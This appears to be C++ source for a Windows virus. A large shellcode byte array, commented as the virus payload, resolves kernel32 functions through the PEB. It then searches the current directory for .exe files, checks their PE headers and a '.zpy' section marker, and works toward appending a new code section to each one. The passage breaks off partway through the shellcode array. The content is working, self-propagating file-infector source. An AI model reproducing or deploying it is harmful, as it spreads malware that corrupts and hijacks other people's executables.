#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include<math.h>
using namespace std;

IMAGE_DOS_HEADER dosHeader;
IMAGE_NT_HEADERS ntHeader;
IMAGE_SECTION_HEADER newSectionHeader;  // 新增节的节表项
IMAGE_SECTION_HEADER lastSectionHeader;    // 旧的最后一个节表项
int numSections = 0;

#define CODE_SIZE 3622
#define JMP_POINT_OFFSET 0
// 病毒载荷
BYTE shellcode[CODE_SIZE] = { 0x55, 0x8b, 0xec, 0x81, 0xec, 0xac, 0x4, 00, 00, 0x53, 0x83, 0x65, 0xec, 00, 0x83, 0x65, 0xd8, 00, 0x83, 0xa5, 0xb0, 0xfe, 0xff, 0xff, 00, 0x64, 0xa1, 0x30, 00, 00, 00, 0x8b, 0x40, 0xc, 0x8b, 0x40, 0xc, 0x89, 0x85, 0xb0, 0xfe, 0xff, 0xff, 0x8b, 00, 0x89, 0x45, 0xd8, 0x83, 0x65, 0xf0, 00, 0xc6, 0x85, 0xd0, 0xfe, 0xff, 0xff, 0x4b, 0xc6, 0x85, 0xd1, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xd2, 0xfe, 0xff, 0xff, 0x45, 0xc6, 0x85, 0xd3, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xd4, 0xfe, 0xff, 0xff, 0x52, 0xc6, 0x85, 0xd5, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xd6, 0xfe, 0xff, 0xff, 0x4e, 0xc6, 0x85, 0xd7, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xd8, 0xfe, 0xff, 0xff, 0x45, 0xc6, 0x85, 0xd9, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xda, 0xfe, 0xff, 0xff, 0x4c, 0xc6, 0x85, 0xdb, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xdc, 0xfe, 0xff, 0xff, 0x33, 0xc6, 0x85, 0xdd, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xde, 0xfe, 0xff, 0xff, 0x32, 0xc6, 0x85, 0xdf, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xe0, 0xfe, 0xff, 0xff, 0x2e, 0xc6, 0x85, 0xe1, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xe2, 0xfe, 0xff, 0xff, 0x44, 0xc6, 0x85, 0xe3, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xe4, 0xfe, 0xff, 0xff, 0x4c, 0xc6, 0x85, 0xe5, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xe6, 0xfe, 0xff, 0xff, 0x4c, 0xc6, 0x85, 0xe7, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xe8, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0xe9, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0x10, 0xff, 0xff, 0xff, 0x47, 0xc6, 0x85, 0x11, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x12, 0xff, 0xff, 0xff, 0x74, 0xc6, 0x85, 0x13, 0xff, 0xff, 0xff, 0x50, 0xc6, 0x85, 0x14, 0xff, 0xff, 0xff, 0x72, 0xc6, 0x85, 0x15, 0xff, 0xff, 0xff, 0x6f, 0xc6, 0x85, 0x16, 0xff, 0xff, 0xff, 0x63, 0xc6, 0x85, 0x17, 0xff, 0xff, 0xff, 0x41, 0xc6, 0x85, 0x18, 0xff, 0xff, 0xff, 0x64, 0xc6, 0x85, 0x19, 0xff, 0xff, 0xff, 0x64, 0xc6, 0x85, 0x1a, 0xff, 0xff, 0xff, 0x72, 0xc6, 0x85, 0x1b, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x1c, 0xff, 0xff, 0xff, 0x73, 0xc6, 0x85, 0x1d, 0xff, 0xff, 0xff, 0x73, 0xc6, 0x85, 0x1e, 0xff, 0xff, 0xff, 00, 0x83, 0x7d, 0xd8, 00, 0xf, 0x84, 0x92, 00, 00, 00, 0x83, 0xbd, 0xb0, 0xfe, 0xff, 0xff, 00, 0xf, 0x84, 0x85, 00, 00, 00, 0x8b, 0x45, 0xd8, 0x3b, 0x85, 0xb0, 0xfe, 0xff, 0xff, 0x74, 0x7a, 0x8b, 0x45, 0xd8, 0x8b, 0x40, 0x30, 0x89, 0x45, 0xb8, 0x8d, 0x85, 0xd0, 0xfe, 0xff, 0xff, 0x89, 0x45, 0xbc, 0x8b, 0x45, 0xbc, 0xf, 0xbe, 00, 0x85, 0xc0, 0x74, 0x32, 0x8b, 0x45, 0xb8, 0xf, 0xbe, 00, 0x85, 0xc0, 0x74, 0x28, 0x8b, 0x45, 0xbc, 0xf, 0xbe, 00, 0x83, 0xc8, 0x20, 0x8b, 0x4d, 0xb8, 0xf, 0xbe, 0x9, 0x83, 0xc9, 0x20, 0x3b, 0xc1, 0x74, 0x2, 0xeb, 0x10, 0x8b, 0x45, 0xbc, 0x40, 0x89, 0x45, 0xbc, 0x8b, 0x45, 0xb8, 0x40, 0x89, 0x45, 0xb8, 0xeb, 0xc4, 0x8b, 0x45, 0xbc, 0xf, 0xbe, 00, 0x85, 0xc0, 0x75, 0x15, 0x8b, 0x45, 0xb8, 0xf, 0xbe, 00, 0x85, 0xc0, 0x75, 0xb, 0x8b, 0x45, 0xd8, 0x8b, 0x40, 0x18, 0x89, 0x45, 0xf0, 0xeb, 0xd, 0x8b, 0x45, 0xd8, 0x8b, 00, 0x89, 0x45, 0xd8, 0xe9, 0x64, 0xff, 0xff, 0xff, 0x8b, 0x45, 0xf0, 0x89, 0x85, 0x6c, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0x6c, 0xfe, 0xff, 0xff, 0x8b, 0x4d, 0xf0, 0x3, 0x48, 0x3c, 0x89, 0x8d, 0x70, 0xfe, 0xff, 0xff, 0x6a, 0x8, 0x58, 0x6b, 0xc0, 00, 0x8b, 0x8d, 0x70, 0xfe, 0xff, 0xff, 0x8b, 0x55, 0xf0, 0x3, 0x54, 0x1, 0x78, 0x89, 0x55, 0xac, 0x8b, 0x45, 0xac, 0x8b, 0x4d, 0xf0, 0x3, 0x48, 0x1c, 0x89, 0x8d, 0x58, 0xfe, 0xff, 0xff, 0x8b, 0x45, 0xac, 0x8b, 0x4d, 0xf0, 0x3, 0x48, 0x20, 0x89, 0x8d, 0x74, 0xfe, 0xff, 0xff, 0x8b, 0x45, 0xac, 0x8b, 0x4d, 0xf0, 0x3, 0x48, 0x24, 0x89, 0x8d, 0x78, 0xfe, 0xff, 0xff, 0x83, 0x65, 0xc4, 00, 0xeb, 0x7, 0x8b, 0x45, 0xc4, 0x40, 0x89, 0x45, 0xc4, 0x8b, 0x45, 0xac, 0x8b, 0x4d, 0xc4, 0x3b, 0x48, 0x18, 0xf, 0x83, 0x98, 00, 00, 00, 0x8b, 0x45, 0xc4, 0x8b, 0x8d, 0x74, 0xfe, 0xff, 0xff, 0x8b, 0x55, 0xf0, 0x3, 0x14, 0x81, 0x89, 0x55, 0xb4, 0x8d, 0x85, 0x10, 0xff, 0xff, 0xff, 0x89, 0x45, 0xb0, 0x8b, 0x45, 0xb4, 0xf, 0xbe, 00, 0x85, 0xc0, 0x74, 0x30, 0x8b, 0x45, 0xb0, 0xf, 0xbe, 00, 0x85, 0xc0, 0x74, 0x26, 0x8b, 0x45, 0xb4, 0xf, 0xbe, 00, 0x83, 0xc8, 0x20, 0x8b, 0x4d, 0xb0, 0xf, 0xbe, 0x9, 0x83, 0xc9, 0x20, 0x3b, 0xc1, 0x75, 0x10, 0x8b, 0x45, 0xb4, 0x40, 0x89, 0x45, 0xb4, 0x8b, 0x45, 0xb0, 0x40, 0x89, 0x45, 0xb0, 0xeb, 0xc6, 0x8b, 0x45, 0xb4, 0xf, 0xbe, 00, 0x85, 0xc0, 0x75, 0x34, 0x8b, 0x45, 0xb0, 0xf, 0xbe, 00, 0x85, 0xc0, 0x75, 0x2a, 0x8b, 0x45, 0xc4, 0x8b, 0x8d, 0x78, 0xfe, 0xff, 0xff, 0xf, 0xb7, 0x4, 0x41, 0x8b, 0x8d, 0x58, 0xfe, 0xff, 0xff, 0x8b, 0x55, 0xf0, 0x3, 0x14, 0x81, 0x89, 0x95, 0x68, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0x68, 0xfe, 0xff, 0xff, 0x89, 0x45, 0xec, 0xeb, 0x5, 0xe9, 0x52, 0xff, 0xff, 0xff, 0xc6, 0x85, 0x68, 0xff, 0xff, 0xff, 0x43, 0xc6, 0x85, 0x69, 0xff, 0xff, 0xff, 0x72, 0xc6, 0x85, 0x6a, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x6b, 0xff, 0xff, 0xff, 0x61, 0xc6, 0x85, 0x6c, 0xff, 0xff, 0xff, 0x74, 0xc6, 0x85, 0x6d, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x6e, 0xff, 0xff, 0xff, 0x46, 0xc6, 0x85, 0x6f, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0x70, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0x71, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x72, 0xff, 0xff, 0xff, 0x41, 0xc6, 0x85, 0x73, 0xff, 0xff, 0xff, 00, 0xc6, 0x85, 0x30, 0xff, 0xff, 0xff, 0x32, 0xc6, 0x85, 0x31, 0xff, 0xff, 0xff, 0x30, 0xc6, 0x85, 0x32, 0xff, 0xff, 0xff, 0x32, 0xc6, 0x85, 0x33, 0xff, 0xff, 0xff, 0x30, 0xc6, 0x85, 0x34, 0xff, 0xff, 0xff, 0x33, 0xc6, 0x85, 0x35, 0xff, 0xff, 0xff, 0x30, 0xc6, 0x85, 0x36, 0xff, 0xff, 0xff, 0x32, 0xc6, 0x85, 0x37, 0xff, 0xff, 0xff, 0x31, 0xc6, 0x85, 0x38, 0xff, 0xff, 0xff, 0x38, 0xc6, 0x85, 0x39, 0xff, 0xff, 0xff, 0x31, 0xc6, 0x85, 0x3a, 0xff, 0xff, 0xff, 0x31, 0xc6, 0x85, 0x3b, 0xff, 0xff, 0xff, 0x36, 0xc6, 0x85, 0x3c, 0xff, 0xff, 0xff, 0x35, 0xc6, 0x85, 0x3d, 0xff, 0xff, 0xff, 00, 0x8d, 0x85, 0x68, 0xff, 0xff, 0xff, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x85, 0x90, 0xfe, 0xff, 0xff, 0x6a, 00, 0x6a, 00, 0x6a, 0x2, 0x6a, 00, 0x6a, 0x1, 0x68, 00, 00, 00, 0x80, 0x8d, 0x85, 0x30, 0xff, 0xff, 0xff, 0x50, 0xff, 0x95, 0x90, 0xfe, 0xff, 0xff, 0x89, 0x85, 0x20, 0xfe, 0xff, 0xff, 0x83, 0x65, 0xa0, 00, 0xc6, 0x85, 0xc0, 0xfe, 0xff, 0xff, 0x54, 0xc6, 0x85, 0xc1, 0xfe, 0xff, 0xff, 0x65, 0xc6, 0x85, 0xc2, 0xfe, 0xff, 0xff, 0x73, 0xc6, 0x85, 0xc3, 0xfe, 0xff, 0xff, 0x74, 0xc6, 0x85, 0xc4, 0xfe, 0xff, 0xff, 0x2e, 0xc6, 0x85, 0xc5, 0xfe, 0xff, 0xff, 0x65, 0xc6, 0x85, 0xc6, 0xfe, 0xff, 0xff, 0x78, 0xc6, 0x85, 0xc7, 0xfe, 0xff, 0xff, 0x65, 0xc6, 0x85, 0xc8, 0xfe, 0xff, 0xff, 00, 0xc6, 0x45, 0x98, 0x2e, 0xc6, 0x45, 0x99, 0x5c, 0xc6, 0x45, 0x9a, 0x2a, 0xc6, 0x45, 0x9b, 0x2e, 0xc6, 0x45, 0x9c, 0x65, 0xc6, 0x45, 0x9d, 0x78, 0xc6, 0x45, 0x9e, 0x65, 0xc6, 0x45, 0x9f, 00, 0xc6, 0x85, 00, 0xff, 0xff, 0xff, 0x46, 0xc6, 0x85, 0x1, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0x2, 0xff, 0xff, 0xff, 0x6e, 0xc6, 0x85, 0x3, 0xff, 0xff, 0xff, 0x64, 0xc6, 0x85, 0x4, 0xff, 0xff, 0xff, 0x46, 0xc6, 0x85, 0x5, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0x6, 0xff, 0xff, 0xff, 0x72, 0xc6, 0x85, 0x7, 0xff, 0xff, 0xff, 0x73, 0xc6, 0x85, 0x8, 0xff, 0xff, 0xff, 0x74, 0xc6, 0x85, 0x9, 0xff, 0xff, 0xff, 0x46, 0xc6, 0x85, 0xa, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0xb, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0xc, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0xd, 0xff, 0xff, 0xff, 0x41, 0xc6, 0x85, 0xe, 0xff, 0xff, 0xff, 00, 0xc6, 0x85, 0x20, 0xff, 0xff, 0xff, 0x46, 0xc6, 0x85, 0x21, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0x22, 0xff, 0xff, 0xff, 0x6e, 0xc6, 0x85, 0x23, 0xff, 0xff, 0xff, 0x64, 0xc6, 0x85, 0x24, 0xff, 0xff, 0xff, 0x4e, 0xc6, 0x85, 0x25, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x26, 0xff, 0xff, 0xff, 0x78, 0xc6, 0x85, 0x27, 0xff, 0xff, 0xff, 0x74, 0xc6, 0x85, 0x28, 0xff, 0xff, 0xff, 0x46, 0xc6, 0x85, 0x29, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0x2a, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0x2b, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x2c, 0xff, 0xff, 0xff, 0x41, 0xc6, 0x85, 0x2d, 0xff, 0xff, 0xff, 00, 0xc6, 0x45, 0x80, 0x46, 0xc6, 0x45, 0x81, 0x69, 0xc6, 0x45, 0x82, 0x6e, 0xc6, 0x45, 0x83, 0x64, 0xc6, 0x45, 0x84, 0x43, 0xc6, 0x45, 0x85, 0x6c, 0xc6, 0x45, 0x86, 0x6f, 0xc6, 0x45, 0x87, 0x73, 0xc6, 0x45, 0x88, 0x65, 0xc6, 0x45, 0x89, 00, 0xc6, 0x85, 0x5c, 0xff, 0xff, 0xff, 0x43, 0xc6, 0x85, 0x5d, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0x5e, 0xff, 0xff, 0xff, 0x6f, 0xc6, 0x85, 0x5f, 0xff, 0xff, 0xff, 0x73, 0xc6, 0x85, 0x60, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x61, 0xff, 0xff, 0xff, 0x48, 0xc6, 0x85, 0x62, 0xff, 0xff, 0xff, 0x61, 0xc6, 0x85, 0x63, 0xff, 0xff, 0xff, 0x6e, 0xc6, 0x85, 0x64, 0xff, 0xff, 0xff, 0x64, 0xc6, 0x85, 0x65, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0x66, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x67, 0xff, 0xff, 0xff, 00, 0xc6, 0x85, 0xb8, 0xfe, 0xff, 0xff, 0x72, 0xc6, 0x85, 0xb9, 0xfe, 0xff, 0xff, 0x62, 0xc6, 0x85, 0xba, 0xfe, 0xff, 0xff, 0x2b, 0xc6, 0x45, 0x8c, 0x52, 0xc6, 0x45, 0x8d, 0x65, 0xc6, 0x45, 0x8e, 0x61, 0xc6, 0x45, 0x8f, 0x64, 0xc6, 0x45, 0x90, 0x46, 0xc6, 0x45, 0x91, 0x69, 0xc6, 0x45, 0x92, 0x6c, 0xc6, 0x45, 0x93, 0x65, 0xc6, 0x45, 0x94, 00, 0xc6, 0x85, 0x74, 0xff, 0xff, 0xff, 0x57, 0xc6, 0x85, 0x75, 0xff, 0xff, 0xff, 0x72, 0xc6, 0x85, 0x76, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0x77, 0xff, 0xff, 0xff, 0x74, 0xc6, 0x85, 0x78, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x79, 0xff, 0xff, 0xff, 0x46, 0xc6, 0x85, 0x7a, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0x7b, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0x7c, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x7d, 0xff, 0xff, 0xff, 00, 0xc6, 0x85, 0xec, 0xfe, 0xff, 0xff, 0x53, 0xc6, 0x85, 0xed, 0xfe, 0xff, 0xff, 0x65, 0xc6, 0x85, 0xee, 0xfe, 0xff, 0xff, 0x74, 0xc6, 0x85, 0xef, 0xfe, 0xff, 0xff, 0x46, 0xc6, 0x85, 0xf0, 0xfe, 0xff, 0xff, 0x69, 0xc6, 0x85, 0xf1, 0xfe, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0xf2, 0xfe, 0xff, 0xff, 0x65, 0xc6, 0x85, 0xf3, 0xfe, 0xff, 0xff, 0x50, 0xc6, 0x85, 0xf4, 0xfe, 0xff, 0xff, 0x6f, 0xc6, 0x85, 0xf5, 0xfe, 0xff, 0xff, 0x69, 0xc6, 0x85, 0xf6, 0xfe, 0xff, 0xff, 0x6e, 0xc6, 0x85, 0xf7, 0xfe, 0xff, 0xff, 0x74, 0xc6, 0x85, 0xf8, 0xfe, 0xff, 0xff, 0x65, 0xc6, 0x85, 0xf9, 0xfe, 0xff, 0xff, 0x72, 0xc6, 0x85, 0xfa, 0xfe, 0xff, 0xff, 0x45, 0xc6, 0x85, 0xfb, 0xfe, 0xff, 0xff, 0x78, 0xc6, 0x85, 0xfc, 0xfe, 0xff, 0xff, 00, 0xc6, 0x85, 0x40, 0xff, 0xff, 0xff, 0x56, 0xc6, 0x85, 0x41, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0x42, 0xff, 0xff, 0xff, 0x72, 0xc6, 0x85, 0x43, 0xff, 0xff, 0xff, 0x74, 0xc6, 0x85, 0x44, 0xff, 0xff, 0xff, 0x75, 0xc6, 0x85, 0x45, 0xff, 0xff, 0xff, 0x61, 0xc6, 0x85, 0x46, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0x47, 0xff, 0xff, 0xff, 0x41, 0xc6, 0x85, 0x48, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0x49, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0x4a, 0xff, 0xff, 0xff, 0x6f, 0xc6, 0x85, 0x4b, 0xff, 0xff, 0xff, 0x63, 0xc6, 0x85, 0x4c, 0xff, 0xff, 0xff, 00, 0xc6, 0x85, 0x50, 0xff, 0xff, 0xff, 0x56, 0xc6, 0x85, 0x51, 0xff, 0xff, 0xff, 0x69, 0xc6, 0x85, 0x52, 0xff, 0xff, 0xff, 0x72, 0xc6, 0x85, 0x53, 0xff, 0xff, 0xff, 0x74, 0xc6, 0x85, 0x54, 0xff, 0xff, 0xff, 0x75, 0xc6, 0x85, 0x55, 0xff, 0xff, 0xff, 0x61, 0xc6, 0x85, 0x56, 0xff, 0xff, 0xff, 0x6c, 0xc6, 0x85, 0x57, 0xff, 0xff, 0xff, 0x46, 0xc6, 0x85, 0x58, 0xff, 0xff, 0xff, 0x72, 0xc6, 0x85, 0x59, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x5a, 0xff, 0xff, 0xff, 0x65, 0xc6, 0x85, 0x5b, 0xff, 0xff, 0xff, 00, 0x83, 0x65, 0xe0, 00, 0x64, 0xa1, 0x30, 00, 00, 00, 0x89, 0x85, 0x64, 0xfe, 0xff, 0xff, 0x6a, 0x4, 0x58, 0xc1, 0xe0, 00, 0x8b, 0x8d, 0x64, 0xfe, 0xff, 0xff, 0x8b, 0x44, 0x1, 0x4, 0x89, 0x85, 0xac, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0xac, 0xfe, 0xff, 0xff, 0x8b, 0x40, 0x3c, 0x89, 0x45, 0xe0, 0x8b, 0x45, 0xe0, 0x3, 0x85, 0xac, 0xfe, 0xff, 0xff, 0x89, 0x45, 0xe0, 0x8b, 0x45, 0xe0, 0x8b, 0x40, 0x28, 0x89, 0x45, 0xe0, 0x8b, 0x45, 0xe0, 0x3, 0x85, 0xac, 0xfe, 0xff, 0xff, 0x89, 0x45, 0xe0, 0x66, 0x87, 0xdb, 0x8d, 0x85, 00, 0xff, 0xff, 0xff, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x85, 0x60, 0xfe, 0xff, 0xff, 0x8d, 0x85, 0x20, 0xff, 0xff, 0xff, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x85, 0x80, 0xfe, 0xff, 0xff, 0x8d, 0x45, 0x80, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x85, 0x7c, 0xfe, 0xff, 0xff, 0x8d, 0x85, 0x5c, 0xff, 0xff, 0xff, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x85, 0xa0, 0xfe, 0xff, 0xff, 0x8d, 0x45, 0x8c, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x45, 0xa4, 0x8d, 0x85, 0x74, 0xff, 0xff, 0xff, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x45, 0xd0, 0x8d, 0x85, 0xec, 0xfe, 0xff, 0xff, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x45, 0xe8, 0x8d, 0x85, 0x40, 0xff, 0xff, 0xff, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x85, 0x8c, 0xfe, 0xff, 0xff, 0x8d, 0x85, 0x50, 0xff, 0xff, 0xff, 0x50, 0xff, 0x75, 0xf0, 0xff, 0x55, 0xec, 0x89, 0x85, 0x88, 0xfe, 0xff, 0xff, 0x8d, 0x85, 0x54, 0xfb, 0xff, 0xff, 0x50, 0x8d, 0x45, 0x98, 0x50, 0xff, 0x95, 0x60, 0xfe, 0xff, 0xff, 0x89, 0x85, 0xcc, 0xfe, 0xff, 0xff, 0x83, 0xbd, 0xcc, 0xfe, 0xff, 0xff, 0xff, 0x75, 0x8, 0x33, 0xc0, 0x40, 0xe9, 0xce, 0x5, 00, 00, 0x8d, 0x85, 0x54, 0xfb, 0xff, 0xff, 0x89, 0x85, 0x84, 0xfe, 0xff, 0xff, 0x33, 0xc0, 0x40, 0x6b, 0xc0, 00, 0xf, 0xbe, 0x84, 0x5, 0x80, 0xfb, 0xff, 0xff, 0x83, 0xf8, 0x2e, 0x75, 0x5, 0xe9, 0x64, 0x5, 00, 00, 0x8b, 0x85, 0x54, 0xfb, 0xff, 0xff, 0x83, 0xe0, 0x10, 0x74, 0x5, 0xe9, 0x54, 0x5, 00, 00, 0x8d, 0x85, 0x80, 0xfb, 0xff, 0xff, 0x89, 0x85, 0x5c, 0xfe, 0xff, 0xff, 0x6a, 00, 0x68, 0x80, 00, 00, 00, 0x6a, 0x3, 0x6a, 00, 0x6a, 00, 0x68, 00, 00, 00, 0xc0, 0xff, 0xb5, 0x5c, 0xfe, 0xff, 0xff, 0xff, 0x95, 0x90, 0xfe, 0xff, 0xff, 0x89, 0x45, 0xfc, 0x83, 0x7d, 0xfc, 00, 0x75, 0x5, 0xe9, 0x1c, 0x5, 00, 00, 0xf, 0x57, 0xc0, 0x66, 0xf, 0x13, 0x45, 0xf4, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0x6a, 0x40, 0x8d, 0x85, 0xdc, 0xfd, 0xff, 0xff, 0x50, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xa4, 0x8b, 0x85, 0x18, 0xfe, 0xff, 0xff, 0x99, 0x89, 0x45, 0xf4, 0x89, 0x55, 0xf8, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0x68, 0xf8, 00, 00, 00, 0x8d, 0x85, 0xbc, 0xfc, 0xff, 0xff, 0x50, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xa4, 0xf, 0xb7, 0x85, 0xc2, 0xfc, 0xff, 0xff, 0x89, 0x45, 0xa0, 0xf, 0xb7, 0x85, 0xdc, 0xfd, 0xff, 0xff, 0x3d, 0x4d, 0x5a, 00, 00, 0x75, 0x1a, 0xf, 0xb7, 0x85, 0xd4, 0xfc, 0xff, 0xff, 0x3d, 0xb, 0x1, 00, 00, 0x75, 0xc, 0x81, 0xbd, 0xbc, 0xfc, 0xff, 0xff, 0x50, 0x45, 00, 00, 0x74, 0x5, 0xe9, 0x7f, 0x4, 00, 00, 0x83, 0xa5, 0x94, 0xfe, 0xff, 0xff, 00, 0x83, 0x65, 0xa8, 00, 0xeb, 0x7, 0x8b, 0x45, 0xa8, 0x40, 0x89, 0x45, 0xa8, 0x8b, 0x45, 0xa8, 0x3b, 0x45, 0xa0, 0xf, 0x8d, 0xe2, 00, 00, 00, 0x6b, 0x45, 0xa8, 0x28, 0x8b, 0x8d, 0x18, 0xfe, 0xff, 0xff, 0x8d, 0x84, 0x1, 0xf8, 00, 00, 00, 0x33, 0xc9, 0x89, 0x45, 0xf4, 0x89, 0x4d, 0xf8, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0x6a, 0x28, 0x8d, 0x85, 0x94, 0xfc, 0xff, 0xff, 0x50, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xa4, 0x85, 0xc0, 0x75, 0xe, 0xff, 0x75, 0xfc, 0xff, 0x95, 0xa0, 0xfe, 0xff, 0xff, 0xe9, 0x90, 00, 00, 00, 0xc6, 0x45, 0xc8, 0x2e, 0xc6, 0x45, 0xc9, 0x7a, 0xc6, 0x45, 0xca, 0x70, 0xc6, 0x45, 0xcb, 0x79, 0xc6, 0x45, 0xcc, 00, 0x8d, 0x85, 0x94, 0xfc, 0xff, 0xff, 0x89, 0x85, 0xa8, 0xfe, 0xff, 0xff, 0x83, 0x65, 0xdc, 00, 0x8b, 0x85, 0xa8, 0xfe, 0xff, 0xff, 0x3, 0x45, 0xdc, 0xf, 0xbe, 00, 0x85, 0xc0, 0x74, 0x2f, 0x8b, 0x45, 0xdc, 0xf, 0xbe, 0x44, 0x5, 0xc8, 0x85, 0xc0, 0x74, 0x23, 0x8b, 0x85, 0xa8, 0xfe, 0xff, 0xff, 0x3, 0x45, 0xdc, 0xf, 0xbe, 00, 0x8b, 0x4d, 0xdc, 0xf, 0xbe, 0x4c, 0xd, 0xc8, 0x3b, 0xc1, 0x74, 0x2, 0xeb, 0x9, 0x8b, 0x45, 0xdc, 0x40, 0x89, 0x45, 0xdc, 0xeb, 0xc1, 0x8b, 0x85, 0xa8, 0xfe, 0xff, 0xff, 0x3, 0x45, 0xdc, 0xf, 0xbe, 00, 0x85, 0xc0, 0x75, 0x18, 0x8b, 0x45, 0xdc, 0xf, 0xbe, 0x44, 0x5, 0xc8, 0x85, 0xc0, 0x75, 0xc, 0xc7, 0x85, 0x94, 0xfe, 0xff, 0xff, 0x1, 00, 00, 00, 0xeb, 0x5, 0xe9, 0xb, 0xff, 0xff, 0xff, 0x83, 0xbd, 0x94, 0xfe, 0xff, 0xff, 00, 0x74, 0x5, 0xe9, 0x6f, 0x3, 00, 00, 0x8b, 0x45, 0xa0, 0x48, 0x6b, 0xc0, 0x28, 0x8b, 0x8d, 0x18, 0xfe, 0xff, 0xff, 0x8d, 0x84, 0x1, 0xf8, 00, 00, 00, 0x33, 0xc9, 0x89, 0x45, 0xf4, 0x89, 0x4d, 0xf8, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0x6a, 0x28, 0x8d, 0x85, 0xb4, 0xfd, 0xff, 0xff, 0x50, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xa4, 0x8b, 0x85, 0xc8, 0xfd, 0xff, 0xff, 0x89, 0x85, 0x50, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0xc4, 0xfd, 0xff, 0xff, 0x89, 0x85, 0x4c, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0xc0, 0xfd, 0xff, 0xff, 0x89, 0x85, 0x54, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0xbc, 0xfd, 0xff, 0xff, 0x89, 0x85, 0x98, 0xfe, 0xff, 0xff, 0x33, 0xc0, 0x40, 0x6b, 0xc0, 00, 0xc6, 0x84, 0x5, 0x24, 0xfe, 0xff, 0xff, 0x2e, 0x33, 0xc0, 0x40, 0xc1, 0xe0, 00, 0xc6, 0x84, 0x5, 0x24, 0xfe, 0xff, 0xff, 0x7a, 0x33, 0xc0, 0x40, 0xd1, 0xe0, 0xc6, 0x84, 0x5, 0x24, 0xfe, 0xff, 